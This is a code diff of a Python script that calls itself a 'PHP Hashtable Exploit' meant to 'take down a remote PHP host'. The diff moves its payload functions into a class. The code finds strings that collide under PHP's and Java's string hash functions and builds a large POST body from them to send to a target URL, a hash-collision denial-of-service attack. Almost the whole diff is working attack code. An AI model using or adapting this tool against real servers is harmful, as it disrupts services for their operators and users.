@@ -39,6 +39,118 @@ import ssl
 import random
 import itertools
 
+class Payloadgenerator:
+    def generateASPPayload(self):
+        return "a=a"
+    
+    def generateJAVAPayload(self):
+        a = self._computeJAVACollisionChars(5)
+        return self._generatePayload(a, 8)
+    
+    def generatePHPPayload(self):
+        # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
+        # compute entries with collisions in PHP hashtable hash function 
+        a = self._computePHPCollisionChars(5)
+        return self._generatePayload(a, 8);
+    
+    def _computePHPCollisionChars(self, count):
+        return self._computeCollisionChars(self._DJBX33A, count)
+    
+    def _computeJAVACollisionChars(self, count):
+        return self._computeCollisionChars(self._DJBX31A, count)
+    
+    def _computeCollisionChars(self, function, count):
+        hashes = {}
+        counter = 0
+        length = 2
+        a = ""
+        for i in range(0, 256):
+            a = a+chr(i)
+        source = list(itertools.product(a, repeat=length))
+        basestr = ''.join(random.choice(source))
+        basehash = function(basestr)
+        print("\tValue: %s\tHash: %s" % (basestr, basehash))
+        for i in basestr:
+            print("\t\tValue: %s\tCharcode: %d" % (i, ord(i)))
+        hashes[str(counter)] = basestr
+        counter = counter + 1
+        for item in source:
+            tempstr = ''.join(item)
+            if tempstr == basestr:
+                continue
+    
+            temphash = function(tempstr) 
+            if temphash == basehash:
+                print("\tValue: %s\tHash: %s" % (tempstr, temphash))
+                for i in tempstr:
+                    print("\t\tValue: %s\tCharcode: %d" % (i, ord(i)))
+                hashes[str(counter)] = tempstr
+                counter = counter + 1
+            if counter >= count:
+                break;
+        if counter != count:
+            print("Not enough values found. Please start the script again")
+            sys.exit(1)
+        return hashes
+    
+    def _DJBXA(self, inputstring, base, start):
+        counter = len(inputstring) - 1
+        result = start
+        for item in inputstring:
+            result = result + (math.pow(base, counter) * ord(item))
+            counter = counter - 1
+        return int(round(result))
+    
+    #PHP
+    def _DJBX33A(self, inputstring):
+        return self._DJBXA(inputstring, 33, 5381)
+    
+    #Java
+    def _DJBX31A(self, inputstring):
+        return self._DJBXA(inputstring, 31, 0)
+    
+    #ASP
+    def _DJBX33X(self, inputstring):
+        counter = len(inputstring) - 1
+        result = 5381
+        for item in inputstring:
+            result = result + (int(round(math.pow(33, counter))) ^ ord(item))
+            counter = counter - 1
+        return int(round(result))
+    
+    def _generatePayload(self, collisionchars, payloadlength):
+        # Taken from:
+        # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
+    
+        # how long should the payload be
+        length = payloadlength
+        size = len(collisionchars)
+        post = ""
+        maxvaluefloat = math.pow(size,length)
+        maxvalueint = int(math.floor(maxvaluefloat))
+        for i in range (maxvalueint):
+            inputstring = self._base_convert(i, size)
+            result = inputstring.rjust(length, "0")
+            for item in collisionchars:
+                result = result.replace(str(item), collisionchars[item])
+            post += "" + urllib.urlencode({result:""}) + "&"
+    
+        return post;
+    
+    def _base_convert(self, num, base):
+        fullalphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        alphabet = fullalphabet[:base]
+        if (num == 0):
+            return alphabet[0]
+        arr = []
+        base = len(alphabet)
+        while num:
+            rem = num % base
+            num = num // base
+            arr.append(alphabet[rem])
+        arr.reverse()
+        return "".join(arr)
+
 def main():
     parser = argparse.ArgumentParser(description="Take down a remote PHP Host", prog="PHP Hashtable Exploit")
     parser.add_argument("-u", "--url", dest="url", help="Url to attack", required=True)
@@ -77,15 +189,16 @@ def main():
 
     if not options.payload:
         print("Generating Payload...")
-
+        
+        generator = Payloadgenerator()
         if options.target == "PHP":
-            payload = generatePHPPayload()
+            payload = generator.generatePHPPayload()
         elif options.target == "ASP":
             #payload = generateASPPayload()
             print("Target %s not yet implemented" % options.target)
             sys.exit(1)
         elif options.target == "JAVA":
-            payload = generateJAVAPayload()
+            payload = generator.generateJAVAPayload()
         else:
             print("Target %s not yet implemented" % options.target)
             sys.exit(1)
@@ -186,117 +299,6 @@ Content-Length: %s\r\n\
             sock.close()
         else:
             sock.close()
-
-def generateASPPayload():
-    return "a=a"
-
-def generateJAVAPayload():
-    a = computeJAVACollisionChars(5)
-    return _generatePayload(a, 8)
-
-def generatePHPPayload():
-    # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
-    # compute entries with collisions in PHP hashtable hash function 
-    a = computePHPCollisionChars(5)
-    return _generatePayload(a, 8);
-    
-def _generatePayload(collisionchars, payloadlength):
-    # Taken from:
-    # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
-
-    # how long should the payload be
-    length = payloadlength
-    size = len(collisionchars)
-    post = ""
-    maxvaluefloat = math.pow(size,length)
-    maxvalueint = int(math.floor(maxvaluefloat))
-    for i in range (maxvalueint):
-        inputstring = _base_convert(i, size)
-        result = inputstring.rjust(length, "0")
-        for item in collisionchars:
-            result = result.replace(str(item), collisionchars[item])
-        post += "" + urllib.urlencode({result:""}) + "&"
-
-    return post;
-
-def _base_convert(num, base):
-    fullalphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-    alphabet = fullalphabet[:base]
-    if (num == 0):
-        return alphabet[0]
-    arr = []
-    base = len(alphabet)
-    while num:
-        rem = num % base
-        num = num // base
-        arr.append(alphabet[rem])
-    arr.reverse()
-    return "".join(arr)
-
-def computePHPCollisionChars(count):
-    return _computeCollisionChars(_DJBX33A, count)
-
-def computeJAVACollisionChars(count):
-    return _computeCollisionChars(_DJBX31A, count)
-
-def _computeCollisionChars(function, count):
-    hashes = {}
-    counter = 0
-    length = 2
-    a = ""
-    for i in range(0, 256):
-        a = a+chr(i)
-    source = list(itertools.product(a, repeat=length))
-    basestr = ''.join(random.choice(source))
-    basehash = function(basestr)
-    print("\tValue: %s\tHash: %s" % (basestr, basehash))
-    for i in basestr:
-        print("\t\tValue: %s\tCharcode: %d" % (i, ord(i)))
-    hashes[str(counter)] = basestr
-    counter = counter + 1
-    for item in source:
-        tempstr = ''.join(item)
-        if tempstr == basestr:
-            continue
-
-        temphash = function(tempstr) 
-        if temphash == basehash:
-            print("\tValue: %s\tHash: %s" % (tempstr, temphash))
-            for i in tempstr:
-                print("\t\tValue: %s\tCharcode: %d" % (i, ord(i)))
-            hashes[str(counter)] = tempstr
-            counter = counter + 1
-        if counter >= count:
-            break;
-    if counter != count:
-        print("Not enough values found. Please start the script again")
-        sys.exit(1)
-    return hashes
-
-def _DJBXA(inputstring, base, start):
-    counter = len(inputstring) - 1
-    result = start
-    for item in inputstring:
-        result = result + (math.pow(base, counter) * ord(item))
-        counter = counter - 1
-    return int(round(result))
-
-#PHP
-def _DJBX33A(inputstring):
-    return _DJBXA(inputstring, 33, 5381)
-
-#Java
-def _DJBX31A(inputstring):
-    return _DJBXA(inputstring, 31, 0)
-
-#ASP
-def _DJBX33X(inputstring):
-    counter = len(inputstring) - 1
-    result = 5381
-    for item in inputstring:
-        result = result + (int(round(math.pow(33, counter))) ^ ord(item))
-        counter = counter - 1
-    return int(round(result))
 
 if __name__ == "__main__":
     main()
